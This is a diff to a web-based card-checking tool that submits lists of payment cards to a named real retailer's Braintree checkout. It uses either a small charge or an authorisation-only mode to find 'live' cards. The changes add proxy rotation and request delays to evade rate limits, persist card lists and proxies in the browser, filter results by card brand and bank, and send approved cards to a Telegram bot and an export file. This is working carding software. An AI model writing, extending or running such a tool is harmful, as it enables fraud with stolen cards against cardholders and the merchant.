@@ -25,7 +25,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Real Bank Auth Checker", version="14.0.0")
+app = FastAPI(title="WeAreTeachers Advanced Multi-Mode Checker", version="15.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
@@ -36,7 +36,7 @@ RAW_DORK_GATES: dict[str, dict[str, str]] = {
         "engine": "charge",
     },
     "weareteachers_auth": {
-        "name": "WeAreTeachers (Authorization Check Engine)",
+        "name": "WeAreTeachers (Real Bank Auth Engine)",
         "base_url": "https://www.weareteachers.com",
         "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
         "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
@@ -312,7 +312,6 @@ def detect_wc_card_type(cc: str, brand_code: str = "") -> str:
     return "visa"
 
 
-# --- ENGINE 1: $9.99 CHARGE CHECKER ---
 async def execute_charge_engine(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://www.weareteachers.com"
     product_url = f"{host}/?add-to-cart=1909302"
@@ -476,7 +475,6 @@ async def execute_charge_engine(session: AsyncSession, cc: str, mm: str, yy: str
     return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code
 
 
-# --- ENGINE 2: REAL BANK AUTH CHECKER (BYPASS SETTLEMENT) ---
 async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://www.weareteachers.com"
     product_url = f"{host}/?add-to-cart=1909302"
@@ -594,7 +592,7 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
             {"key": "wc_braintree_credit_card_payment_nonce", "value": nonce_token},
             {"key": "wc-braintree-credit-card-card-type", "value": wc_card_type},
             {"key": "wc_braintree_credit_card_card_type", "value": wc_card_type},
-            {"key": "wc-braintree-credit-card-new-payment-method", "value": False},
+            {"key": "wc-braintree_credit_card-new-payment-method", "value": False},
             {"key": "wc-braintree-credit-card-capture", "value": False}
         ],
     }
@@ -782,7 +780,7 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WeAreTeachers Real Bank Auth Checker</title>
+    <title>WeAreTeachers Advanced Multi-Mode Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @keyframes pulseGlow {
@@ -807,15 +805,15 @@ async def index() -> str:
         }
     </style>
 </head>
-<body class="bg-zinc-950 text-white min-h-screen p-6 selection:bg-emerald-500 selection:text-black">
+<body class="bg-zinc-950 text-white min-h-screen p-6 selection:bg-emerald-500 selection:text-black" onload="loadSessionData()">
     <main class="max-w-5xl mx-auto space-y-6">
         <div class="flex flex-wrap items-center justify-between border-b border-zinc-800 pb-4 gap-2">
             <div>
                 <h1 class="text-2xl font-bold text-emerald-400 flex items-center gap-2">
                     <span class="inline-block w-3 h-3 bg-emerald-500 rounded-full animate-ping"></span>
-                    WeAreTeachers Real Bank Auth Checker
+                    WeAreTeachers Advanced Checker
                 </h1>
-                <p class="text-xs text-zinc-400 font-mono">Real Gateway Authorization (No False Positives)</p>
+                <p class="text-xs text-zinc-400 font-mono">With Auto-Save Session, Proxy Rotator, & Delay Control</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="autoFormatCards()" class="text-xs bg-emerald-950 hover:bg-emerald-900 text-emerald-200 border border-emerald-700/50 px-3 py-1.5 rounded-lg transition font-semibold">
@@ -831,7 +829,7 @@ async def index() -> str:
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                 <div class="md:col-span-2">
                     <label class="block text-xs font-medium text-zinc-400 mb-1">Gateway Engine Mode</label>
-                    <select id="targetSelect" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
+                    <select id="targetSelect" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500" onchange="saveSessionData()">
                         <option value="weareteachers_bt">💳 $9.99 USD Checkout (Sale/Charge Engine)</option>
                         <option value="weareteachers_auth">🛡️ Real Bank Auth Only (Authorization Check / No Capture)</option>
                     </select>
@@ -848,28 +846,32 @@ async def index() -> str:
                 </div>
             </div>
 
-            <!-- Telegram Config Box -->
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-zinc-950/80 p-3 rounded-lg border border-zinc-800">
+            <!-- Rate Limiter Delay & Telegram Settings -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 bg-zinc-950/80 p-3 rounded-lg border border-zinc-800">
+                <div>
+                    <label class="block text-xs font-medium text-zinc-400 mb-1">Request Delay (ms)</label>
+                    <input id="requestDelay" type="number" value="500" min="0" max="5000" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
+                </div>
                 <div>
                     <label class="block text-xs font-medium text-zinc-400 mb-1">Telegram Bot Token</label>
-                    <input id="tgToken" type="text" placeholder="123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
+                    <input id="tgToken" type="text" placeholder="Bot Token..." class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono" oninput="saveSessionData()">
                 </div>
                 <div>
                     <label class="block text-xs font-medium text-zinc-400 mb-1">Telegram Chat ID</label>
-                    <input id="tgChatId" type="text" placeholder="-1001234567890 or ID" class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
+                    <input id="tgChatId" type="text" placeholder="Chat ID..." class="w-full bg-zinc-900 border border-zinc-700 rounded-lg p-2 text-xs font-mono" oninput="saveSessionData()">
                 </div>
             </div>
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div class="space-y-2">
                     <div class="flex justify-between items-center">
-                        <label class="text-xs font-medium text-zinc-400">Live Proxies Box</label>
+                        <label class="text-xs font-medium text-zinc-400">Live Proxies Box (Auto-Rotator Active)</label>
                         <button onclick="checkAndPruneProxies()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1 rounded text-xs font-semibold transition text-white">
                             ⚡ Test & Auto-Prune
                         </button>
                     </div>
                     <textarea id="proxyInput" rows="4" placeholder="http://user:pass@host:port"
-                        class="w-full bg-zinc-950 border border-emerald-900/40 rounded-lg p-3 text-xs font-mono focus:outline-none text-emerald-300 custom-scrollbar"></textarea>
+                        class="w-full bg-zinc-950 border border-emerald-900/40 rounded-lg p-3 text-xs font-mono focus:outline-none text-emerald-300 custom-scrollbar" oninput="saveSessionData()"></textarea>
                 </div>
                 <div class="space-y-2">
                     <label class="text-xs font-medium text-rose-400">Dead Proxies Box (Auto-Dropped)</label>
@@ -881,7 +883,7 @@ async def index() -> str:
             <div class="space-y-2">
                 <label class="block text-xs font-medium text-zinc-400">Cards List (Supports YY or YYYY)</label>
                 <textarea id="cardInput" rows="4" placeholder="545512...|02|26|005"
-                    class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none custom-scrollbar"></textarea>
+                    class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none custom-scrollbar" oninput="saveSessionData()"></textarea>
             </div>
 
             <!-- Animated Progress Bar -->
@@ -922,6 +924,15 @@ async def index() -> str:
                 </button>
             </div>
 
+            <!-- Filter Buttons for Live Box -->
+            <div class="flex gap-2 items-center pt-2">
+                <span class="text-xs text-zinc-400 font-semibold">Filter Live:</span>
+                <button onclick="filterLive('ALL')" class="text-[11px] bg-zinc-800 hover:bg-zinc-700 px-2.5 py-1 rounded text-zinc-200 transition">All</button>
+                <button onclick="filterLive('VISA')" class="text-[11px] bg-zinc-800 hover:bg-zinc-700 px-2.5 py-1 rounded text-sky-300 transition">Visa</button>
+                <button onclick="filterLive('MASTER')" class="text-[11px] bg-zinc-800 hover:bg-zinc-700 px-2.5 py-1 rounded text-amber-300 transition">Mastercard</button>
+                <button onclick="filterLive('CHASE')" class="text-[11px] bg-zinc-800 hover:bg-zinc-700 px-2.5 py-1 rounded text-emerald-300 transition">Chase</button>
+            </div>
+
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
                     <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2 flex items-center justify-between">
@@ -940,6 +951,7 @@ async def index() -> str:
     <script>
     let isPaused = false;
     let isStopped = false;
+    let allLiveResults = [];
 
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     function playTone(type) {
@@ -953,6 +965,22 @@ async def index() -> str:
         gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
         osc.start();
         osc.stop(audioCtx.currentTime + 0.25);
+    }
+
+    function saveSessionData() {
+        localStorage.setItem("wat_cards", document.getElementById("cardInput").value);
+        localStorage.setItem("wat_proxies", document.getElementById("proxyInput").value);
+        localStorage.setItem("wat_tgToken", document.getElementById("tgToken").value);
+        localStorage.setItem("wat_tgChatId", document.getElementById("tgChatId").value);
+        localStorage.setItem("wat_target", document.getElementById("targetSelect").value);
+    }
+
+    function loadSessionData() {
+        if (localStorage.getItem("wat_cards")) document.getElementById("cardInput").value = localStorage.getItem("wat_cards");
+        if (localStorage.getItem("wat_proxies")) document.getElementById("proxyInput").value = localStorage.getItem("wat_proxies");
+        if (localStorage.getItem("wat_tgToken")) document.getElementById("tgToken").value = localStorage.getItem("wat_tgToken");
+        if (localStorage.getItem("wat_tgChatId")) document.getElementById("tgChatId").value = localStorage.getItem("wat_tgChatId");
+        if (localStorage.getItem("wat_target")) document.getElementById("targetSelect").value = localStorage.getItem("wat_target");
     }
 
     function autoFormatCards() {
@@ -983,6 +1011,7 @@ async def index() -> str:
             }
         });
         ta.value = formatted.join("\\n");
+        saveSessionData();
         alert(`Auto-Formatted: ${formatted.length} cards cleaned!`);
     }
 
@@ -990,6 +1019,7 @@ async def index() -> str:
         const ta = document.getElementById("cardInput");
         const unique = [...new Set(ta.value.split("\\n").map(l => l.trim()).filter(Boolean))];
         ta.value = unique.join("\\n");
+        saveSessionData();
     }
 
     function clearLogs() {
@@ -999,19 +1029,29 @@ async def index() -> str:
         document.getElementById("deadCount").textContent = "0";
         document.getElementById("checkedCount").textContent = "0";
         document.getElementById("progressBar").style.width = "0%";
+        allLiveResults = [];
     }
 
     function exportLiveResults() {
-        const rows = document.getElementById("liveBox").querySelectorAll("div");
-        let text = "";
-        rows.forEach(r => text += r.textContent + "\\n");
-        if (!text) return alert("No live cards yet.");
+        if (!allLiveResults.length) return alert("No live cards yet.");
+        let text = allLiveResults.join("\\n");
         const blob = new Blob([text], { type: "text/plain" });
         const url = URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url;
-        a.download = "live_real_auth_cards.txt";
+        a.download = "live_approved_cards.txt";
         a.click();
+    }
+
+    function filterLive(keyword) {
+        const liveBox = document.getElementById("liveBox");
+        liveBox.innerHTML = "";
+        let filtered = keyword === 'ALL' ? allLiveResults : allLiveResults.filter(item => item.toUpperCase().includes(keyword));
+        filtered.forEach(line => {
+            const row = document.createElement("div");
+            row.textContent = line;
+            liveBox.appendChild(row);
+        });
     }
 
     function togglePause() {
@@ -1063,6 +1103,7 @@ async def index() -> str:
         await Promise.all(Array.from({ length: Math.min(maxThreads, lines.length) }, () => worker()));
         proxyTa.value = liveProxies.join("\\n");
         deadProxyTa.value = deadProxies.join("\\n");
+        saveSessionData();
         deadBox.innerHTML = `<div class="text-emerald-400 font-bold">Proxy Pruning Complete: ${liveProxies.length} Live, ${deadProxies.length} Dead (Auto-dropped).</div>`;
     }
 
@@ -1082,12 +1123,13 @@ async def index() -> str:
         const bar = document.getElementById("progressBar");
         const target = document.getElementById("targetSelect").value;
         const maxThreads = parseInt(document.getElementById("cardThreads").value) || 3;
+        const requestDelay = parseInt(document.getElementById("requestDelay").value) || 500;
 
         const tgToken = document.getElementById("tgToken").value.trim();
         const tgChatId = document.getElementById("tgChatId").value.trim();
 
         const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
-        const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
+        let proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
         if (!cards.length) return alert("Please paste cards first.");
 
         btn.disabled = true;
@@ -1103,14 +1145,10 @@ async def index() -> str:
         liveBox.innerHTML = "";
         deadBox.innerHTML = "";
         bar.style.width = "0%";
-
-        const pairs = cards.map((c, i) => ({
-            card: c,
-            proxy: proxies.length ? proxies[i % proxies.length] : ""
-        }));
+        allLiveResults = [];
 
         let idx = 0;
-        const total = pairs.length;
+        const total = cards.length;
 
         async function cardWorker() {
             while (idx < total && !isStopped) {
@@ -1119,10 +1157,14 @@ async def index() -> str:
                 }
                 if (isStopped) break;
 
-                const pair = pairs[idx++];
+                const currentCard = cards[idx++];
+                // Proxy Rotator logic (pumipili ng proxyikot kung marami)
+                const currentProxy = proxies.length ? proxies[(idx - 1) % proxies.length] : "";
+
                 try {
-                    let url = `/api/auth/check?card=${encodeURIComponent(pair.card)}&target=${encodeURIComponent(target)}`;
-                    if (pair.proxy) url += `&proxy=${encodeURIComponent(pair.proxy)}`;
+                    let url = `/api/auth/check?card=${encodeURIComponent(currentCard)}&target=${encodeURIComponent(target)}`;
+                    if (currentProxy) url += `&proxy=${encodeURIComponent(currentProxy)}`;
+                    
                     const resp = await fetch(url);
                     const d = await resp.json();
 
@@ -1132,19 +1174,20 @@ async def index() -> str:
 
                     const bank = d.bin_info?.bank ? `${d.bin_info.bank} (${d.bin_info.country})` : "BIN";
                     const gate = d.target_used ? ` [${d.target_used}]` : "";
-                    const line = `[${d.status}] ${pair.card} -> ${d.reason}${gate} | ${bank} (${d.latency_ms}ms)`;
+                    const line = `[${d.status}] ${currentCard} -> ${d.reason}${gate} | ${bank} (${d.latency_ms}ms)`;
 
                     const row = document.createElement("div");
                     row.textContent = line;
 
                     if (d.status === "LIVE") {
                         live++;
+                        allLiveResults.push(line);
                         document.getElementById("liveCount").textContent = String(live);
                         liveBox.appendChild(row);
                         liveBox.scrollTop = liveBox.scrollHeight;
                         playTone('live');
                         if (tgToken && tgChatId) {
-                            sendTelegram(tgToken, tgChatId, `🔥 REAL BANK AUTH APPROVED 🔥\\n${line}`);
+                            sendTelegram(tgToken, tgChatId, `🔥 APPROVED / LIVE 🔥\\n${line}`);
                         }
                     } else {
                         dead++;
@@ -1153,13 +1196,17 @@ async def index() -> str:
                         deadBox.scrollTop = deadBox.scrollHeight;
                         playTone('dead');
                     }
+
+                    if (requestDelay > 0) {
+                        await new Promise(r => setTimeout(r, requestDelay));
+                    }
                 } catch (err) {
                     checked++;
                     dead++;
                     document.getElementById("checkedCount").textContent = String(checked);
                     document.getElementById("deadCount").textContent = String(dead);
                     const row = document.createElement("div");
-                    row.textContent = `[ERROR] ${pair.card} -> ${err.message}`;
+                    row.textContent = `[ERROR] ${currentCard} -> ${err.message}`;
                     deadBox.appendChild(row);
                     deadBox.scrollTop = deadBox.scrollHeight;
                 }
